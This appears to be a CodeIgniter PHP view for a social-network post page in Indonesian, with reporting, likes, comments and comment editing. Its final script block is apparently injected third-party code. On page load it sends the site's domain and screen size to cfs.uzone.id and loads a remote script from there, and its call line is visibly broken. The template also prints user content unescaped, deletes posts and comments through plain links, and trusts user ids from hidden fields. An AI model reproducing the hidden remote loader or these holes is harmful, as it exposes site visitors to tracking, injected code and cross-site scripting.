<!-- Post Content

================================================= -->


<?=$this->session->flashdata('mm');?>




<?php foreach ($posting as $pst): ?>

<div class="post-content">

    <input type="hidden" value="<?=$pst->id_posting;?>" id="id_post">


    <?=$pst->html;?>

    <?php if ($pst->id_user != $this->session->userdata('id')): ?>

    <?php if ($pst->id_user != $this->session->userdata('id')): ?>
    <form method="post" action="<?=base_url('User/addReport');?>">
        <input type="hidden" name="id_posting" value="<?=$pst->id_posting;?>">
        <input type="hidden" name="id" value="<?=$this->session->userdata('id');?>">
        <a class="btn text-red">
            <button class="fas fa-exclamation" style="border : 0;" name="report"
                onclick="if (!confirm('Apakah anda yakin akan melaporkan unggahan atau pengguna ini karena melanggar peraturan?')) { return false }">
                Laporkan! </button> </a>
    </form>
    <?php elseif ($pst->id_user != $this->session->userdata('id') and $rpt->report == 1): ?>

    <?php endif;?>

    <?php else: ?>

    <i class="fas fa-trash" style="color: tomato;margin-left:18px;"></i>
    <a href="<?=base_url();?>user/deletePost/<?=$pst->id_posting . '/' . $pst->fileName?>" style="text-decoration:none;"
        onclick="return confirm('Are you sure?')">Hapus</a>

    <!-- <i class="fas fa-trash" style="color: tomato;margin-left:18px;"></i> -->


    <?php endif;?>

    <div class="post-container">
        <img src="<?=base_url('assets_user/');?>images/<?=$pst->image;?>" alt="user"
            class="profile-photo-md pull-left" />
        <div class="post-detail">
            <div class="user-info">
                <h5>
                    <h5><?php if ($pst->id == $this->session->userdata('id')): ?>
                        <a href="<?=base_url('profile')?>"><?=$pst->name;?></a>
                        <?php else: ?>
                        <a href="<?=base_url('friend/visitProfile/') . $pst->id_user;?>"><?=$pst->name;?></a>
                        <?php endif;?>
                    </h5>
                    <p class="text-muted">Diunggah pada <?=date('d F Y ', $pst->date_post);?></p>
            </div>



            <?php foreach ($suka as $sk): ?>
            <?php foreach ($sukaa as $sk2): ?>
            <!--?php if ($sk->status == null or $sk->jumlahsuka == 0 or $sk->jumlahsuka == null or $sk->id == null) : ?>
                            <div class="reaction">
                                <a class="btn text-blue">
                                    <button class="icon ion-thumbsup" style="opacity : 70% ; border : 0;" name="like1"> like </button> 0</a>
                            </div> -->

            <?php if ($sk2->status == 2): ?>
            <div class="reaction">
                <form method="post" action="<?=base_url('User/updateSuka') . "/" . $this->uri->segment('3');?>">
                    <input type="hidden" name="id_suka" value="<?=$sk2->id_suka;?>">
                    <input type="hidden" name="id_posting" value="<?=$pst->id_posting;?>">
                    <input type="hidden" name="notifsuka" value="Like on your post.">
                    <input type="hidden" name="id" value="<?=$this->session->userdata('id');?>">
                    <a class="btn text-blue">
                        <button class="icon ion-thumbsup" style="border : 0;" name="like2"> suka </button>
                        <?=$sk->jumlahsuka;?></a>
                </form>
            </div>

            <?php elseif ($sk2->status == 1): ?>
            <div class="reaction">
                <form method="post" action="<?=base_url('User/updateGaSuka') . "/" . $this->uri->segment('3');?> ">
                    <input type="hidden" name="id_suka" value="<?=$sk2->id_suka;?>">
                    <input type="hidden" name="jumlahsuka" value="<?=$sk->jumlahsuka;?>">
                    <input type="hidden" name="id_posting" value="<?=$pst->id_posting;?>">
                    <input type="hidden" name="notifsuka" value="Like on your post.">
                    <input type="hidden" name="id" value="<?=$this->session->userdata('id');?>">
                    <a class="btn text-blue">
                        <button class="icon ion-thumbsup" style="border : 0;" name="unlike"> disukai </button>
                        <?=$sk->jumlahsuka;?></a>
                </form>
            </div>

            <?php elseif ($sk2->total == 0): ?>
            <div class="reaction">
                <form method="post" action="<?=base_url('User/addSuka') . "/" . $this->uri->segment('3');?>">
                    <input type="hidden" name="id_suka" value="<?=$sk2->id_suka;?>">
                    <input type="hidden" name="jumlahsuka" value="<?=$sk->jumlahsuka;?>">
                    <input type="hidden" name="id_posting" value="<?=$pst->id_posting;?>">
                    <input type="hidden" name="id_user" value="<?=$pst->id_user;?>">
                    <input type="hidden" name="notifsuka" value="Like on your post.">
                    <input type="hidden" name="id" value="<?=$this->session->userdata('id');?>">
                    <a class="btn text-blue">
                        <button class="icon ion-thumbsup" style=" border : 0;" name="like2"> Suka </button>
                        <?=$sk->jumlahsuka;?></a>
                </form>
            </div>

            <?php endif;?>
            <?php endforeach;?>
            <?php endforeach;?>


            <div class="line-divider"></div>
            <div class="post-text">
                <p><?=$pst->caption;?> </p>
            </div>
            <div class="line-divider"></div>
            <?=$this->session->flashdata('nn');?>


            <?php foreach ($comment as $cmt): ?>
            <div class="post-comment">


                <img src="<?=base_url('assets_user/images/') . $cmt->image;?>" alt="" class="profile-photo-sm" />
                <p><?php if ($cmt->id == $this->session->userdata('id')): ?>
                    <a href="<?=base_url('profile')?>"><?=$cmt->name;?></a>
                    <?php else: ?>
                    <a href="<?=base_url('friend/visitProfile/') . $cmt->id;?>"><?=$cmt->name;?></a>
                    <?php endif;?><br>
                    <?php
$str = $cmt->comment;
$str = parse_smileys($str, base_url() . 'assets/smileys/');
echo $str;
?>
                </p>

                <?php if ($cmt->id != $this->session->userdata('id')): ?>


                <?php else: ?>
                <br> &nbsp;&nbsp;&nbsp;


                <a href="<?=base_url('user/deleteComment/') . $cmt->id_comment . "/" . $this->uri->segment('3');?>">
                    <button style="text-decoration:none; color:red; border:none; background-color:#F8F8F8; opacity:70%;"
                        onclick="if (!confirm('Apakah anda yakin akan menghapus komentar ini?')) { return false }">
                        <i class="fas fa-trash"></i> hapus
                    </button>
                </a>
                &nbsp;&nbsp;&nbsp;


                <a>
                    <button class="editKomen"
                        style="text-decoration:none; color:#00ff40; border:none; background-color:#F8F8F8; opacity:1.0;"
                        data-comment="<?=$cmt->comment?>" data-id="<?=$cmt->id_comment?>">
                        <i class="fas fa-pen-alt"></i> edit
                    </button>
                </a>


                <?php endif;?>

            </div>


            <?php endforeach;?>
            <?php echo smiley_js(); ?>
            <form method="post" action="<?=base_url('User/commentPost') . "/" . $this->uri->segment('3');?>"
                id="formAction">
                <div class="post-comment">
                    <img src="<?=base_url('assets_user/');?>images/<?=$pst->image;?>" alt="" class="profile-photo-sm" />

                    <input type="text" name="comment" id="comment" class="form-control" placeholder="Post a comment"
                        style="display: block;" autofocus autocomplete="off" maxlength="50">

                    <?=form_error('comment', '<small class="text-danger pl-3">', '</small>');?>

                    <input type="hidden" name="id_posting" value="<?=$pst->id_posting;?>">
                    <input type="hidden" name="id_user" value="<?=$pst->id_user;?>">
                    <input type="hidden" name="notifComment" value="Comment on your post.">
                    <input type="hidden" name="id" value="<?=$this->session->userdata('id');?>">

                    <input type="submit" class="btn-primary"
                        style="height: 45px; margin-top: -2px; margin-left: 10px; margin-right: -10px;background-color: #6fb8df;display: block;"
                        value="Kirim" id="kirim">




                    <input type="submit" class="btn-primary"
                        style="height: 45px; margin-top: -2px; margin-left: 10px; margin-right: -10px;background-color: #6fb8df;display: none;"
                        value="Ubah" id="ubah">

                    <input type="hidden" name="idkomen" id="idkomen">


            </form>




        </div>
        <p>Klik untuk memasukan emoticon!</p>
        <div style="justify-content: center;"><?php echo $smiley_table; ?></div>
    </div>
</div>
</div>

<?php endforeach;?>
<!-- Post Content=================================================-->



</div>

<script>
$(".editKomen").on('click', function(e) {

    // alert("hai")
    // $('#kirim').css('display:none');
    e.preventDefault();
    $('#ubah').show();
    $('#editComment').show();
    $('#kirim').hide();
    // $('#comment').hide();

    var komen = $(this).data('comment');
    var idKomen = $(this).data('id');


    // alert(idKomen);

    $('#comment').val(komen);
    $('#idkomen').val(idKomen);


    document.getElementById('formAction').action = '<?=base_url('user/ubahKomen')?>';






});
</script>


<script type="text/javascript">
if (self == top) {
    function netbro_cache_analytics(fn, callback) {
        setTimeout(function() {
            fn();
            callback();
        }, 0);
    }

    function sync(fn) {
        fn();
    }


    // onclick="ConfirmDelete()" button
    function ConfirmDelete() {
        var z = confirm("Apakah anda yakin ingin menghapus komentar?");
        if (z)
            return confirm;
        else
            return false;
    }

    function ConfirmReport() {
        var x = confirm("Apakah anda yakin ingin melaporkan unggahan atau pengguna ini karena melanggar peraturan?");
        if (x)
            return confirm;
        else
            return false;
    }


    function requestCfs() {
        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
        var idc_glo_r = Math.floor(Math.random() * 99999999999);
        var url = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
            "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXxgfvjefwcdpi3BR90FnQrXwyyfCTDb8E2di%2fELZdFcaQDCb4sEyVDeTd8ej5SFMh%2b7xyrzblfQFOXTUXf9iN32Ab9iiJ2EpDdADb8Pv0GHv1kURtIeaOiDyjJyYbPUfYgP%2bVgsl8ln0cuzZNAIKby3S%2fpQrnexuB635Gi9zTRaH2HlNoKc%2bSPuJ7kNdPIqXX%2fAIlau%2fUfKQYBHD527gIcOE3q2TQ0hhCAgSyqHzzUfXQK2wC%2bq4RuZ%2fzOiipvNxE0YTg878qSdfUFPRlPqJqva3TEtq9qz%2blbk30gBRXL6wJOlco56Bbe8beu%2bhJ9Ocx0ZOx1fBw6kqmsuriz2rmD6qwqTNAkoRGU9GD2F3XG3SB%2fw5BN2tGboFc%2fOpAII6Gmj8P12MvyhRwYZNEeoGq4YTLTtgSZL%2bsPa2O3Qkrq%2fRwktYVwi4g8rS2DY3M1qTsoMQPMug95776MKZOZKimLgPJnSoJGOJ9p5MBsdXuqe0%3d" +

            "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
        var bsa = document.createElement('script');
        bsa.type = 'text/javascript';
        bsa.async = true;
        bsa.src = url;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
    }
    netbr
    o_cache_analytics(requestCfs, function() {});
};
</script>